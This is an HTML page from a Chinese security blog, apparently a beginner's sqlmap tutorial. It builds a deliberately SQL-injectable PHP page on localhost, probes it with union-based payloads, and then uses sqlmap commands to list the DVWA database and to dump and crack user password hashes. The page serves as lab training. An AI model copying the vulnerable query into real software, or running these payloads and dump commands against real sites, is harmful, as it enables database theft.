@@ -1,0 +1,276 @@
+<!DOCTYPE html>
+<html lang>
+  <head><meta name="generator" content="Hexo 3.9.0"><meta charset="UTF-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+
+
+<meta http-equiv="Cache-Control" content="no-transform">
+<meta http-equiv="Cache-Control" content="no-siteapp">
+
+<meta name="theme-color" content="#f8f5ec">
+<meta name="msapplication-navbutton-color" content="#f8f5ec">
+<meta name="apple-mobile-web-app-capable" content="yes">
+<meta name="apple-mobile-web-app-status-bar-style" content="#f8f5ec">
+
+<meta name="description" content="SQLMAP 新手教程（一）"><link rel="alternate" href="/atom.xml" title="J.A.R.V.I.S"><link rel="shortcut icon" type="image/x-icon" href="/favicon.ico?v=2.11.0">
+<link rel="canonical" href="https://pwn4justice.github.io/2019/06/11/SQLMAP-新手教程（一）/">
+
+<link rel="stylesheet" type="text/css" href="/lib/fancybox/jquery.fancybox.css"><link rel="stylesheet" type="text/css" href="/lib/nprogress/nprogress.min.css">
+<link rel="stylesheet" type="text/css" href="/css/style.css?v=2.11.0">
+
+<script id="baidu_push">
+(function(){
+    var bp = document.createElement('script');
+    var curProtocol = window.location.protocol.split(':')[0];
+    if (curProtocol === 'https') {
+        bp.src = 'https://zz.bdstatic.com/linksubmit/push.js';
+    }
+    else {
+        bp.src = 'http://push.zhanzhang.baidu.com/push.js';
+    }
+    var s = document.getElementsByTagName("script")[0];
+    s.parentNode.insertBefore(bp, s);
+})();
+</script>
+<script>
+  window.config = {"leancloud":{"app_id":null,"app_key":null},"toc":true,"fancybox":true,"pjax":true,"latex":false};
+</script>
+
+    <title>SQLMAP 新手教程（一） - J.A.R.V.I.S</title>
+  </head>
+
+  <body><div id="mobile-navbar" class="mobile-navbar">
+  <div class="mobile-header-logo">
+    <a href="/." class="logo">J.A.R.V.I.S</a>
+  </div>
+  <div class="mobile-navbar-icon">
+    <span></span>
+    <span></span>
+    <span></span>
+  </div>
+</div>
+
+<nav id="mobile-menu" class="mobile-menu slideout-menu">
+  <ul class="mobile-menu-list"><a href="/">
+        <li class="mobile-menu-item">首页
+          </li>
+      </a><a href="/about/">
+        <li class="mobile-menu-item">关于
+          </li>
+      </a></ul>
+</nav>
+<div class="container" id="mobile-panel">
+      <header id="header" class="header"><div class="logo-wrapper">
+  <a href="/." class="logo">J.A.R.V.I.S</a>
+</div>
+
+<nav class="site-navbar"><ul id="menu" class="menu"><li class="menu-item">
+          <a class="menu-item-link" href="/">
+            首页
+            </a>
+        </li>
+      <li class="menu-item">
+          <a class="menu-item-link" href="/about/">
+            关于
+            </a>
+        </li>
+      </ul></nav>
+</header>
+
+      <main id="main" class="main">
+        <div class="content-wrapper">
+          <div id="content" class="content"><article class="post">
+    <header class="post-header">
+      <h1 class="post-title">SQLMAP 新手教程（一）
+        </h1>
+
+      <div class="post-meta">
+        <span class="post-time">
+          2019-06-11
+        </span></div>
+    </header>
+
+    <div class="post-toc" id="post-toc">
+    <h2 class="post-toc-title">文章目录</h2>
+    <div class="post-toc-content">
+      <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#0x00-环境介绍"><span class="toc-text">0x00 环境介绍</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x01-SQL-注入漏洞页面编写"><span class="toc-text">0x01 SQL 注入漏洞页面编写</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x02-使用-SQLMAP-进行测试"><span class="toc-text">0x02 使用 SQLMAP 进行测试</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#使用-SQLMAP-查看数据库"><span class="toc-text">使用 SQLMAP 查看数据库</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#使用-SQLMAP-查看当前数据库"><span class="toc-text">使用 SQLMAP 查看当前数据库</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#使用-SQLMAP-爆出数据库-dvwa-中的表"><span class="toc-text">使用 SQLMAP 爆出数据库(dvwa)中的表</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#使用-SQLMAP-爆出表-users-的列"><span class="toc-text">使用 SQLMAP 爆出表(users)的列</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#使用-SQLMAP-破解账户密码值"><span class="toc-text">使用 SQLMAP 破解账户密码值</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#查看-SQLMAP-保存在本地的-LOG-文件"><span class="toc-text">查看 SQLMAP 保存在本地的 LOG 文件</span></a></li></ol></li></ol>
+    </div>
+  </div><div class="post-content"><p>前言：现在的网络安全措施日益健全，尤其是针对像 SQL 注入这样的常见漏洞也变得越来越不常见，或者难以利用，对新手体验/学习都不是很好；而且网络安全法也日益完善，所以目前来说，我认为使用 DVWA 或者 pikachu 这样的平台来熟悉 OWASP TOP 10 以及相关安全工具的应用，是必要且稳妥的。</p>
+<p>本文主要介绍一些 SQLMAP 的简单应用，由于暂时只是测试低级别的 SQL 注入，所以可以自己写一个有 SQL 注入的页面来进行测试，本文就是基于此的。</p>
+<a id="more"></a>
+
+<h2 id="0x00-环境介绍"><a href="#0x00-环境介绍" class="headerlink" title="0x00 环境介绍"></a>0x00 环境介绍</h2><ul>
+<li>操作系统：Windows 10</li>
+<li>软件：phpStudy v5.2 珍藏版、SQLMAP</li>
+</ul>
+<h2 id="0x01-SQL-注入漏洞页面编写"><a href="#0x01-SQL-注入漏洞页面编写" class="headerlink" title="0x01 SQL 注入漏洞页面编写"></a>0x01 SQL 注入漏洞页面编写</h2><p>在 <code>D:\phpStudy5.2\WWW\</code> 默认的网站根目录下（或者自己新建一个diy目录，记得访问时加上即可），编写以下两个文件：</p>
+<blockquote>
+<p>conn.php            //数据库连接页面</p>
+<p>sqli.php                //漏洞页面</p>
+</blockquote>
+<p><strong>conn.php：</strong></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">	$server = <span class="string">"localhost"</span>;</span><br><span class="line">	$username = <span class="string">"your_account"</span>;</span><br><span class="line">	$password = <span class="string">"your_password"</span>;</span><br><span class="line">	$db = <span class="string">"dvwa"</span>;		&lt;!-- 这里采取 dvwa 数据库测试，安装 DVWA 是不必要的，只是不想自己建库/表.. --&gt;</span><br><span class="line">	<span class="comment">//create a connection</span></span><br><span class="line">	$conn = mysqli_connect($server, $username, $password, $db);</span><br><span class="line">	</span><br><span class="line">	<span class="comment">//test</span></span><br><span class="line">	<span class="keyword">if</span> (!$conn)&#123;</span><br><span class="line">		<span class="keyword">die</span>(<span class="string">"Connect failed! in conn.php, Info: "</span> . mysqli_connect_error());</span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line">	<span class="comment">//echo "Success.";</span></span><br></pre></td></tr></table></figure>
+
+<p><strong>sqli.php：</strong>这是一个超级简陋的存在 sql 注入的页面，相当于 DVWA 的 LOW 级别吧… :joy:</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line">&lt;html&gt;</span><br><span class="line">	&lt;head&gt;</span><br><span class="line">		&lt;title&gt;Test Sql-injection&lt;/title&gt;</span><br><span class="line">		&lt;meta charset=<span class="string">"utf-8"</span>&gt;</span><br><span class="line">	&lt;/head&gt;</span><br><span class="line">	&lt;body&gt;</span><br><span class="line"></span><br><span class="line">		&lt;form action=<span class="comment"># method="GET"&gt;</span></span><br><span class="line">		&lt;input type=<span class="string">"text"</span> name=<span class="string">"id"</span> /&gt;</span><br><span class="line">		&lt;input type=<span class="string">"submit"</span> name=<span class="string">"Submit"</span> /&gt;</span><br><span class="line">		&lt;/form&gt;</span><br><span class="line">		</span><br><span class="line">		<span class="meta">&lt;?php</span></span><br><span class="line">			<span class="keyword">require_once</span>(<span class="string">"conn.php"</span>);</span><br><span class="line">			<span class="keyword">if</span>( <span class="keyword">isset</span>($_GET[<span class="string">"id"</span>]) )&#123;</span><br><span class="line">				$id = $_GET[<span class="string">"id"</span>];</span><br><span class="line">				</span><br><span class="line">				<span class="comment">//query from db</span></span><br><span class="line">				$query = <span class="string">"SELECT first_name, last_name FROM users WHERE user_id = '$id';"</span>;</span><br><span class="line">				$result = mysqli_query($conn, $query);</span><br><span class="line">		</span><br><span class="line">				<span class="keyword">if</span>( mysqli_num_rows($result) &gt; <span class="number">0</span> )&#123;</span><br><span class="line">					<span class="comment">//Get the data</span></span><br><span class="line">					<span class="keyword">while</span>($row = $result-&gt;fetch_assoc())&#123;</span><br><span class="line">						<span class="keyword">echo</span> <span class="string">"first name: "</span> . $row[<span class="string">"first_name"</span>] . <span class="string">"&lt;br&gt;"</span>;</span><br><span class="line">						<span class="keyword">echo</span> <span class="string">"last name : "</span> . $row[<span class="string">"last_name"</span>]. <span class="string">"&lt;br&gt;"</span>;</span><br><span class="line">					&#125;</span><br><span class="line">				&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">					<span class="keyword">echo</span> <span class="string">""</span>;</span><br><span class="line">				&#125;</span><br><span class="line">			&#125;</span><br><span class="line">			mysqli_close($conn);				</span><br><span class="line">		<span class="meta">?&gt;</span></span><br><span class="line">	&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br><span class="line">&lt;!-- 此页面来熟悉 SQLMAP 的使用基本上没有什么阻碍 --&gt;</span><br></pre></td></tr></table></figure>
+
+<p><strong>正常访问页面</strong></p>
+<p><img src="ok.png" alt="ok"></p>
+<br>
+
+<p><strong>出错情况</strong></p>
+<p>使用 <code>1&#39; and 1=1 --</code></p>
+<p><img src="ok2.png" alt="ok2"></p>
+<p><br>使用 <code>1&#39; and 1=2 --</code></p>
+<p><img src="err.png" alt="err"></p>
+<p><br>使用 <code>1&#39; union select 1 --</code></p>
+<p><img src="err2.png" alt="err2"></p>
+<p><br>使用 <code>1&#39; union select 1,2 --</code></p>
+<p><img src="err3.png" alt="err3"></p>
+<p><br><strong>注：</strong></p>
+<p>1.注释时，<code>--</code> 后面要加一个或多个空格</p>
+<p>2.select 1,2 这种写法只在 MySQL 里比较好使，SQL Server 或者 Oracle 都应该使用 select null,null[…] 这种写法</p>
+<p><em>这样可以简单地测试出是有 SQL 注入漏洞的，下面就可以使用 SQLMAP 这个神器了</em></p>
+<br>
+
+
+
+<h2 id="0x02-使用-SQLMAP-进行测试"><a href="#0x02-使用-SQLMAP-进行测试" class="headerlink" title="0x02 使用 SQLMAP 进行测试"></a>0x02 使用 SQLMAP 进行测试</h2><p>基本使用：<code>sqlmap.py -u &quot;your_url&quot; [options] ------ 不加参数时默认只判断有没有注入点</code></p>
+<br>
+
+<h3 id="使用-SQLMAP-查看数据库"><a href="#使用-SQLMAP-查看数据库" class="headerlink" title="使用 SQLMAP 查看数据库"></a>使用 SQLMAP 查看数据库</h3><blockquote>
+<p>sqlmap.py -u “<a href="http://localhost/diy/sqli.php?id=1&quot;" target="_blank" rel="noopener">http://localhost/diy/sqli.php?id=1&quot;</a> –dbs</p>
+</blockquote>
+<p><img src="dbs.png" alt="dbs"></p>
+<br>
+
+<h3 id="使用-SQLMAP-查看当前数据库"><a href="#使用-SQLMAP-查看当前数据库" class="headerlink" title="使用 SQLMAP 查看当前数据库"></a>使用 SQLMAP 查看当前数据库</h3><blockquote>
+<p> sqlmap.py -u “<a href="http://localhost/diy/sqli.php?id=1&quot;" target="_blank" rel="noopener">http://localhost/diy/sqli.php?id=1&quot;</a> –current-db</p>
+</blockquote>
+<p><img src="currentdb.png" alt="currentdb"></p>
+<br>
+
+<h3 id="使用-SQLMAP-爆出数据库-dvwa-中的表"><a href="#使用-SQLMAP-爆出数据库-dvwa-中的表" class="headerlink" title="使用 SQLMAP 爆出数据库(dvwa)中的表"></a>使用 SQLMAP 爆出数据库(dvwa)中的表</h3><blockquote>
+<p>sqlmap.py -u “<a href="http://localhost/diy/sqli.php?id=1&quot;" target="_blank" rel="noopener">http://localhost/diy/sqli.php?id=1&quot;</a> –table -D “dvwa”</p>
+</blockquote>
+<p><img src="tables.png" alt="dvwa"></p>
+<br>
+
+<p><strong>如果 -D 不使用 <code>&quot;</code> 则会报错：</strong></p>
+<p><img src="noquote.png" alt="noquote"></p>
+<br>
+
+<h3 id="使用-SQLMAP-爆出表-users-的列"><a href="#使用-SQLMAP-爆出表-users-的列" class="headerlink" title="使用 SQLMAP 爆出表(users)的列"></a>使用 SQLMAP 爆出表(users)的列</h3><blockquote>
+<p>sqlmap.py -u “<a href="http://localhost/diy/sqli.php?id=1&quot;" target="_blank" rel="noopener">http://localhost/diy/sqli.php?id=1&quot;</a> –columns -T “users” -D “dvwa”</p>
+</blockquote>
+<p><img src="columns.png" alt="columns"></p>
+<br>
+
+<h3 id="使用-SQLMAP-破解账户密码值"><a href="#使用-SQLMAP-破解账户密码值" class="headerlink" title="使用 SQLMAP 破解账户密码值"></a>使用 SQLMAP 破解账户密码值</h3><blockquote>
+<p>sqlmap.py -u “<a href="http://localhost/diy/sqli.php?id=1&quot;" target="_blank" rel="noopener">http://localhost/diy/sqli.php?id=1&quot;</a> –dump -C “user,password,user_id” -T “users” -D “dvwa”</p>
+</blockquote>
+<p><img src="crack_md5.png" alt="crack_md5"></p>
+<br>
+
+<p><strong>也可以使用 MD5 网站解密，结果一致</strong></p>
+<p><img src="md5.png" alt="md5"></p>
+<br>
+
+<h3 id="查看-SQLMAP-保存在本地的-LOG-文件"><a href="#查看-SQLMAP-保存在本地的-LOG-文件" class="headerlink" title="查看 SQLMAP 保存在本地的 LOG 文件"></a>查看 SQLMAP 保存在本地的 LOG 文件</h3><blockquote>
+<p>C:\Users\Admin\AppData\Local\sqlmap\output\127.0.0.1</p>
+</blockquote>
+<p><strong>日志文件会保存执行过的命令，以及自动化产生的 payload 方便学习</strong></p>
+<br>
+
+<p><img src="log.png" alt="log"></p>
+<br>
+
+<p><strong>同时也会保存破解的 MD5 为 csv 文件</strong></p>
+<p><img src="csv.png" alt="csv"></p>
+<br>
+
+<p><strong>注：</strong></p>
+<p>1.<code>-T</code> 和 <code>-D</code> 选项后的值要用双引号的值括起来，单引号会报错。</p>
+<br>
+
+<p><strong>今天的实验就到这里了~</strong></p>
+
+      </div>
+      <div class="post-copyright">
+    <p class="copyright-item">
+      <span>原文作者: </span>
+      <a href="https://pwn4justice.github.io">pwn4justice</a>
+    </p>
+    <p class="copyright-item">
+      <span>原文链接: </span>
+      <a href="https://pwn4justice.github.io/2019/06/11/SQLMAP-新手教程（一）/">https://pwn4justice.github.io/2019/06/11/SQLMAP-新手教程（一）/</a>
+    </p>
+    <p class="copyright-item">
+      <span>License: </span><a rel="license" href="http://creativecommons.org/licenses/by-nc/4.0/" target="_blank">知识共享署名-非商业性使用 4.0 国际许可协议</a>
+    </p>
+  </div>
+      <footer class="post-footer">
+        
+        <nav class="post-nav"><a class="prev" href="/2019/06/22/lxml-etree-tutorial-part-one/">
+        <i class="iconfont icon-left"></i>
+        <span class="prev-text nav-default">lxml.etree tutorial - part one</span>
+        <span class="prev-text nav-mobile">上一篇</span>
+      </a>
+    <a class="next" href="/2019/06/10/SQL-注入之坑/">
+        <span class="next-text nav-default">SQL 注入之坑</span>
+        <span class="prev-text nav-mobile">下一篇</span>
+        <i class="iconfont icon-right"></i>
+      </a>
+    </nav></footer>
+    </article></div><div class="comments" id="comments"><div id="vcomments"></div>
+    </div></div>
+      </main>
+
+      <footer id="footer" class="footer"><div class="social-links"><a href="mailto:bin.ring0@foxmail.com" class="iconfont icon-email" title="email"></a>
+        <a href="https://github.com/pwn4justice" class="iconfont icon-github" title="github"></a>
+        <a href="/atom.xml" class="iconfont icon-rss" title="rss"></a>
+    </div><div class="copyright">
+  <span class="power-by">
+    由 <a class="hexo-link" href="https://hexo.io/">Hexo</a> 强力驱动
+  </span>
+  <span class="division">|</span>
+  <span class="theme-info">
+    主题 - 
+    <a class="theme-link" href="https://github.com/ahonn/hexo-theme-even">Even</a>
+  </span>
+
+  <span class="copyright-year">&copy;2019<span class="heart">
+      <i class="iconfont icon-heart"></i>
+    </span>
+    <span class="author">pwn4justice</span>
+  </span>
+</div>
+</footer>
+
+      <div class="back-to-top" id="back-to-top">
+        <i class="iconfont icon-up"></i>
+      </div>
+    </div><!-- valine Comments: add by pwn4justice at 0:19 2019/7/15 -->
+  <script src="//cdn1.lncld.net/static/js/3.0.4/av-min.js"></script>
+  <script src="//cdn.jsdelivr.net/gh/xcss/valine@v1.2.0/dist/Valine.min.js"></script>
+  <script type="text/javascript">
+	new Valine({
+		el: '#vcomments',
+		notify: false,
+		verify: false,
+		app_id: "c0QrSCsFudA3BmlYdMzo2VwF-MdYXbMMI",
+		app_key: "488SWS1mtwysEQnDRnqDDRXH",
+		placeholder: "Give me some advise ...",
+		avatar: 'mm',
+		visitor: true		<!-- add by me -->
+	});
+  </script>
+  <!-- origin value:"cdn.jsdelivr.net/gh/xcss/valine@v1.1.7/dist/Valine.min.js" --><script type="text/javascript" src="/lib/jquery/jquery.min.js"></script>
+  <script type="text/javascript" src="/lib/slideout/slideout.js"></script>
+  <script type="text/javascript" src="/lib/fancybox/jquery.fancybox.pack.js"></script>
+  <script type="text/javascript" src="/lib/pjax/jquery.pjax.min.js"></script>
+  <script type="text/javascript" src="/lib/nprogress/nprogress.min.js"></script>
+  <script type="text/javascript" src="/js/src/even.js?v=2.11.0"></script>
+</body>
+</html>
